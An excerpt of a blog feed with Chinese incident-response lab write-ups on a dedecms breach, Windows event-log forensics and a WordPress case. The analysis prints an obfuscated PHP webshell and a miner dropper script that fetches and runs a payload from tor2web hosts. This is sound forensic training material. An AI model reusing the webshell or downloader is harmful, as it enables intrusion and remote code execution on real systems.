href="#1-黑客的IP是？-flag格式：flag-黑客的ip地址-，如：flag-127-0-0-1" class="headerlink" title="1.黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}"></a>1.黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}</h3><p>日志文件在&#x2F;www&#x2F;admin&#x2F;websec_80&#x2F;log&#x2F;下<br><code>awk &#39;&#123;print $1&#125;&#39; nginx_access_2023-12-22.log|sort|uniq -c|sort -nr</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720162458339.png" alt="image-20240720162458339"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.10.135&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客攻陷网站的具体时间是？-flag格式：flag-年-月-日-时-分-秒-，如：flag-2023-12-24-22-23-24"><a href="#2-黑客攻陷网站的具体时间是？-flag格式：flag-年-月-日-时-分-秒-，如：flag-2023-12-24-22-23-24" class="headerlink" title="2.黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24}"></a>2.黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24}</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720162639795.png" alt="image-20240720162639795"><br>站点是dedecms<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720162702220.png" alt="image-20240720162702220"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720162930851.png" alt="image-20240720162930851"><br>管理员用户存在弱口令admin&#x2F;12345678<br>黑客创建了hacker用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023-12-22 19:08:34&#125;</span><br></pre></td></tr></table></figure><h3 id="3-黑客上传webshell的名称及密码是？-flag格式：flag-黑客上传的webshell名称-webshell密码-，如：flag-webshell-php-pass"><a href="#3-黑客上传webshell的名称及密码是？-flag格式：flag-黑客上传的webshell名称-webshell密码-，如：flag-webshell-php-pass" class="headerlink" title="3.黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass}"></a>3.黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass}</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720165136305.png" alt="image-20240720165136305"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;eJxLLUvM0VCJD/APDolWT85NUY/VtAYARQUGOA==&#x27;</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将eval改成echo运行得到源码<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720165636304.png" alt="image-20240720165636304"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;404.php-cmd&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客提权后设置的后门文件名称是？-flag格式：flag-后门文件绝对路径加上名称-，如：flag-etc-passwd"><a href="#4-黑客提权后设置的后门文件名称是？-flag格式：flag-后门文件绝对路径加上名称-，如：flag-etc-passwd" class="headerlink" title="4.黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{&#x2F;etc&#x2F;passwd}"></a>4.黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{&#x2F;etc&#x2F;passwd}</h3><p><code>history</code><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720163911561.png" alt="image-20240720163911561"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/usr/bin/find&#125;</span><br></pre></td></tr></table></figure><h3 id="5-对黑客上传的挖矿病毒进行分析，获取隐藏的Flag"><a href="#5-对黑客上传的挖矿病毒进行分析，获取隐藏的Flag" class="headerlink" title="5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag"></a>5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720165806203.png" alt="image-20240720165806203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">R=$(shuf -i 1-29 -n 1);</span><br><span class="line">sleep $&#123;R:-0&#125;;</span><br><span class="line">BP=$(dirname &quot;$(command -v yes)&quot;);</span><br><span class="line">BP=$&#123;BP:-&quot;/usr/bin&quot;&#125;;G1=&quot;curl&quot;;</span><br><span class="line">if [ $(curl --version 2&gt;/dev/null|grep &quot;curl &quot;|wc -l) -eq 0 ];then </span><br><span class="line">  G1=&quot;echo&quot;;for f in $&#123;BP&#125;/*;</span><br><span class="line">  do </span><br><span class="line">    strings $f 2&gt;/dev/null|grep -q &quot;CURLOPT_VERBOSE&quot; &amp;&amp; G1=&quot;$f&quot; &amp;&amp; break;</span><br><span class="line">  done;</span><br><span class="line">fi;</span><br><span class="line">G2=&quot;wget&quot;;</span><br><span class="line">if [ $(wget --version 2&gt;/dev/null|grep &quot;wgetrc &quot;|wc -l) -eq 0 ];then </span><br><span class="line">  G2=&quot;echo&quot;;</span><br><span class="line">  for f in $&#123;BP&#125;/*;</span><br><span class="line">  do </span><br><span class="line">    strings $f 2&gt;/dev/null|grep -q &quot;to &lt;bug-wget@gnu.org&gt;&quot; &amp;&amp; G2=&quot;$f&quot; &amp;&amp; break;</span><br><span class="line">  done;</span><br><span class="line">fi;</span><br><span class="line">if [ $(cat /etc/hosts|grep -i &quot;onion.\|timesync.su\|tor2web&quot;|wc -l) -ne 0 ];then </span><br><span class="line">  echo &quot;127.0.0.1 localhost&quot; &gt; /etc/hosts &gt;/dev/null 2&gt;&amp;1;</span><br><span class="line">fi; </span><br><span class="line">C=&quot; -fsSLk --connect-timeout 26 --max-time 75 &quot;;</span><br><span class="line">W=&quot; --quiet --tries=1 --no-check-certificate --connect-timeout=26 --timeout=75 &quot;;</span><br><span class="line">H=&quot;https://an7kmd2wp4xo7hpr&quot;;</span><br><span class="line">T1=&quot;.tor2web.su/&quot;;</span><br><span class="line">T2=&quot;.d2web.org/&quot;;</span><br><span class="line">T3=&quot;.onion.sh/&quot;;</span><br><span class="line">P=&quot;src/ldm&quot;;</span><br><span class="line">($G1 $C $H$T1$P||$G1 $C $H$T2$P||$G1 $C $H$T3$P||$G2 $W $H$T1$P||$G2 $W $H$T2$P||$G2 $W $H$T3$P)|sh &amp;</span><br></pre></td></tr></table></figure><p>拼接执行了ldm程序 跟进查看 ldm文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python2 -c &quot;import base64;exec(base64.b64decode(&#x27;aW1wb3J0IHRpbWUKd2hpbGUgMToKICAgIHByaW50KCJmbGFne3dlYnNlY19UcnVlQDg4OCF9IikKICAgIHRpbWUuc2xlZXAoMTAwMCk=&#x27;))&quot; &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240720170307445.png" alt="image-20240720170307445"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;websec_True@888!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第五章-Windows-实战-evtx-文件分析</title>
      <link href="/2024/07/19/%E7%AC%AC%E4%BA%94%E7%AB%A0-Windows-%E5%AE%9E%E6%88%98-evtx-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/19/%E7%AC%AC%E4%BA%94%E7%AB%A0-Windows-%E5%AE%9E%E6%88%98-evtx-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/71</span><br><span class="line">1.将黑客成功登录系统所使用的IP地址作为Flag值提交；</span><br><span class="line">2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；</span><br><span class="line">3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；</span><br><span class="line">4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；</span><br><span class="line">5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。</span><br></pre></td></tr></table></figure><h3 id="1-将黑客成功登录系统所使用的IP地址作为Flag值提交；"><a href="#1-将黑客成功登录系统所使用的IP地址作为Flag值提交；" class="headerlink" title="1.将黑客成功登录系统所使用的IP地址作为Flag值提交；"></a>1.将黑客成功登录系统所使用的IP地址作为Flag值提交；</h3><p>查看安全日志(安全.evtx) <code>4624</code>筛选登录的日志<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240718190856507.png" alt="image-20240718190856507"></p><blockquote><p>查看事件 发现如下IP</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">网络信息:</span><br><span class="line">工作站名:WIN-B1B1T3K57G9</span><br><span class="line">源网络地址:172.16.1.1</span><br><span class="line">源端口:60741</span><br><span class="line">网络信息:</span><br><span class="line">工作站名:WIN-B1B1T3K57G9</span><br><span class="line">源网络地址:127.0.0.1</span><br><span class="line">源端口:0</span><br><span class="line">网络信息:</span><br><span class="line">工作站名:WIN-B1B1T3K57G9</span><br><span class="line">源网络地址:192.168.36.133</span><br><span class="line">源端口:47076</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.36.133&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；"><a href="#2-黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；" class="headerlink" title="2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；"></a>2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；</h3><p>继续查看登录日志<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240718192714972.png" alt="image-20240718192714972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">新登录:</span><br><span class="line">安全 ID:S-1-5-21-17081676-1000286879-1443824681-500</span><br><span class="line">帐户名:Adnimistartro</span><br><span class="line">帐户域:WIN-B1B1T3K57G9</span><br><span class="line">登录 ID:0x1530B9</span><br><span class="line">登录 GUID:&#123;00000000-0000-0000-0000-000000000000&#125;</span><br><span class="line"></span><br><span class="line">进程信息:</span><br><span class="line">进程 ID:0x2878</span><br><span class="line">进程名:C:\Windows\System32\winlogon.exe</span><br><span class="line"></span><br><span class="line">网络信息:</span><br><span class="line">工作站名:WIN-B1B1T3K57G9</span><br><span class="line">源网络地址:192.168.36.133</span><br><span class="line">源端口:53971</span><br></pre></td></tr></table></figure><p><code>4738</code>能够筛选更换用户名事件</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240718233902100.png" alt="image-20240718233902100"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Adnimistartro&#125;</span><br></pre></td></tr></table></figure><h3 id="3-黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；"><a href="#3-黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；" class="headerlink" title="3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；"></a>3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；</h3><p><code>4663</code>筛选成功访问的文件<br>根据时间确定 黑客登录系统后访问的那个关键位置文件，且多次查看<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240718234559961.png" alt="image-20240718234559961"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对象:</span><br><span class="line">对象服务器:Security</span><br><span class="line">对象类型:File</span><br><span class="line">对象名:C:\Windows\System32\SMI\Store\Machine\SCHEMA.DAT</span><br><span class="line">句柄 ID:0xce0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SCHEMA&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；"><a href="#4-黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；" class="headerlink" title="4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；"></a>4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240718235701961.png" alt="image-20240718235701961"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">Event</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span></span><br><span class="line">- <span class="tag">&lt;<span class="name">System</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Provider</span> <span class="attr">Name</span>=<span class="string">&quot;MySQL&quot;</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">EventID</span> <span class="attr">Qualifiers</span>=<span class="string">&quot;49152&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">EventID</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Level</span>&gt;</span>4<span class="tag">&lt;/<span class="name">Level</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Task</span>&gt;</span>0<span class="tag">&lt;/<span class="name">Task</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Keywords</span>&gt;</span>0x80000000000000<span class="tag">&lt;/<span class="name">Keywords</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">TimeCreated</span> <span class="attr">SystemTime</span>=<span class="string">&quot;2020-10-08T07:53:09.0000000Z&quot;</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">EventRecordID</span>&gt;</span>313<span class="tag">&lt;/<span class="name">EventRecordID</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Channel</span>&gt;</span>Application<span class="tag">&lt;/<span class="name">Channel</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Computer</span>&gt;</span>WIN-B1B1T3K57G9<span class="tag">&lt;/<span class="name">Computer</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Security</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">System</span>&gt;</span></span><br><span class="line">- <span class="tag">&lt;<span class="name">EventData</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Data</span>&gt;</span>.phpcustom_mysql (mysqld 5.5.62-log) starting as process 8820 ...<span class="tag">&lt;/<span class="name">Data</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventData</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Event</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8820&#125;</span><br></pre></td></tr></table></figure><h3 id="5-黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。"><a href="#5-黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。" class="headerlink" title="5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。"></a>5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。</h3><p><code>1074</code>筛选出查看计算机的开机、关机、重启的时间以及原因</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240719000408622.png" alt="image-20240719000408622">有5条重启记录,2条Adnimistartro、2条Administrator、1条SYSTEM<br>根据题意  黑客修改后的用户重启系统的次数为3次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows主机日志分析办法与思路</title>
      <link href="/2024/07/18/Windows%E4%B8%BB%E6%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%8A%9E%E6%B3%95%E4%B8%8E%E6%80%9D%E8%B7%AF/"/>
      <url>/2024/07/18/Windows%E4%B8%BB%E6%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%8A%9E%E6%B3%95%E4%B8%8E%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>在Windows系统中，日志默认存放位置目录为：%SystemRoot%\System32\Winevt\Logs\</p><p><strong>常见的 .evtx 文件</strong></p><table><thead><tr><th>文件名</th><th>描述</th></tr></thead><tbody><tr><td><strong>Application.evtx</strong></td><td>记录应用程序相关的事件日志</td></tr><tr><td><strong>System.evtx</strong></td><td>记录系统级别的事件日志</td></tr><tr><td><strong>Security.evtx</strong></td><td>记录安全事件和审计日志</td></tr><tr><td><strong>Setup.evtx</strong></td><td>记录与系统安装和升级相关的事件日志</td></tr><tr><td><strong>ForwardedEvents.evtx</strong></td><td>用于记录从其他系统转发的事件日志</td></tr></tbody></table><p>一般我们主要查看的三类日志是：应用程序日志、安全日志、系统日志</p><ul><li><p>应用程序日志：包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，默认存放路径：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p></li><li><p>安全日志：记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。这个日志一般是安全工程师重点关注对象。默认存放路径：%SystemRoot%\System32\Winevt\Logs\Security.evtx</p></li><li><p>系统日志：记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。默认存放路径：%SystemRoot%\System32\Winevt\Logs\System.evtx</p></li></ul><h3 id="Windows-事件日志"><a href="#Windows-事件日志" class="headerlink" title="Windows 事件日志"></a>Windows 事件日志</h3><p>Windows 事件日志是记录系统事件的文件，涵盖了应用程序错误、系统错误和安全事件等。通过这些日志，我们可以追溯问题发生的原因，了解计算机的健康状况，以及排除故障</p><blockquote><p>比如系统崩溃时，Windows 就会创建一个日志来记录崩溃原因。</p></blockquote><p>事件日志通常包括以下这些信息：</p><ul><li><strong>日志名称</strong>：事件所属的类型</li></ul><ul><li><strong>来源</strong>：产生事件的应用或组件</li><li><strong>事件 ID</strong>：用于识别具体事件的编号</li><li><strong>级别</strong>：事件的严重程度，比如「信息」、「警告」和「错误」等</li><li><strong>用户</strong>：事件发生时的用户账户</li><li><strong>操作代码</strong>：也叫 OpCode，记录触发事件时所执行的操作</li><li><strong>记录时间</strong>：事件发生的具体时间</li><li><strong>任务类别</strong>：提供事件更多细节的分类</li><li><strong>关键字</strong>：用于分类事件的关键词，常见的有「经典」</li><li><strong>计算机</strong>：记录事件的计算机名称</li></ul><h3 id="常见的事件-ID说明及详细信息"><a href="#常见的事件-ID说明及详细信息" class="headerlink" title="常见的事件 ID说明及详细信息"></a><strong>常见的事件 ID说明及详细信息</strong></h3><h4 id="账户登录与注销"><a href="#账户登录与注销" class="headerlink" title="账户登录与注销"></a><strong>账户登录与注销</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4624</td><td>用户成功登录到系统</td><td>登录类型、登录用户、登录来源、IP地址</td></tr><tr><td>4625</td><td>用户尝试登录系统但失败</td><td>失败原因、登录类型、失败的用户名</td></tr><tr><td>4634</td><td>用户成功注销系统</td><td>注销的用户名、注销类型</td></tr><tr><td>4647</td><td>用户主动注销会话</td><td>注销的用户名</td></tr></tbody></table><h4 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a><strong>账户管理</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4720</td><td>系统中创建了新用户账户</td><td>新账户名、创建的账户名</td></tr><tr><td>4722</td><td>用户账户被启用</td><td>启动的账户名</td></tr><tr><td>4725</td><td>用户账户被禁用</td><td>禁用的账户名</td></tr><tr><td>4726</td><td>用户账户被删除</td><td>删除的账户名、删除者的账户名</td></tr></tbody></table><h4 id="安全策略变更"><a href="#安全策略变更" class="headerlink" title="安全策略变更"></a><strong>安全策略变更</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4670</td><td>权限服务状态发生了变更</td><td>对象名称、权限变更的细节</td></tr><tr><td>4719</td><td>系统的审计策略发生了更改</td><td>更改的策略、变更者的账户名</td></tr></tbody></table><h4 id="系统事件"><a href="#系统事件" class="headerlink" title="系统事件"></a><strong>系统事件</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>6005</td><td>Windows 事件日志服务启动</td><td>无</td></tr><tr><td>6006</td><td>Windows 事件日志服务停止</td><td>无</td></tr><tr><td>6008</td><td>系统未预期地关闭</td><td>关机时间、原因等</td></tr></tbody></table><h4 id="特权使用"><a href="#特权使用" class="headerlink" title="特权使用"></a><strong>特权使用</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4672</td><td>分配给用户或组的特权服务</td><td>特权类型、用户账户名</td></tr><tr><td>4673</td><td>请求执行特权服务</td><td>请求的服务类型、用户账户名</td></tr></tbody></table><h4 id="防火墙事件"><a href="#防火墙事件" class="headerlink" title="防火墙事件"></a><strong>防火墙事件</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4946</td><td>新的防火墙规则被添加</td><td>规则名称、添加者的账户名</td></tr><tr><td>4947</td><td>防火墙规则被修改</td><td>规则名称、修改的细节</td></tr></tbody></table><h4 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a><strong>文件访问</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>4663</td><td>用户尝试访问受保护的文件或对象</td><td>对象名称、访问的类型、用户账户名</td></tr></tbody></table><h4 id="服务状态"><a href="#服务状态" class="headerlink" title="服务状态"></a><strong>服务状态</strong></h4><table><thead><tr><th>事件ID</th><th>说明</th><th>详细信息</th></tr></thead><tbody><tr><td>7036</td><td>服务已更改状态（如启动或停止）</td><td>服务名称、新状态</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第四章_Windows实战-wordpress</title>
      <link href="/2024/07/17/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Windows%E5%AE%9E%E6%88%98-wordpress/"/>
      <url>/2024/07/17/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Windows%E5%AE%9E%E6%88%98-wordpress/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/54</span><br><span class="line">administrator xj@123456</span><br><span class="line">1.请提交攻击者攻击成功的第一时间，格式：flag&#123;YY:MM:DD hh:mm:ss&#125;</span><br><span class="line">2.请提交攻击者的浏览器版本 flag&#123;Firgfox/2200&#125;</span><br><span class="line">3.请提交攻击者目录扫描所使用的工具名称</span><br><span class="line">4.找到攻击者写入的恶意后门文件，提交文件名（完整路径）</span><br><span class="line">5.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</span><br><span class="line">6.请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag&#123;1.exe&#125;</span><br></pre></td></tr></table></figure><blockquote><p>日志在nginx目录下</p></blockquote><h3 id="1-请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#1-请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="1.请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>1.请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h3><blockquote><p>该日志文件很短  只有3435行</p><p>不过 熟练一下awk在日志分析的利用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $1&#125;&#x27; access.log|sort|uniq -c|sort -r</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717205325966.png" alt="image-20240717205325966"> 可知道 192.168.141.55访问了3410次 主要去查看 有关 192.168.141.55 这个ip的访问内容 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717211729043.png" alt="image-20240717211729043"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态码为302</span><br><span class="line">爆破用户名密码 成功登进后台</span><br><span class="line">/manage/login.php =&gt; /manage/welcome.php</span><br><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure><h3 id="2-请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#2-请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="2.请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>2.请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h3><p><img 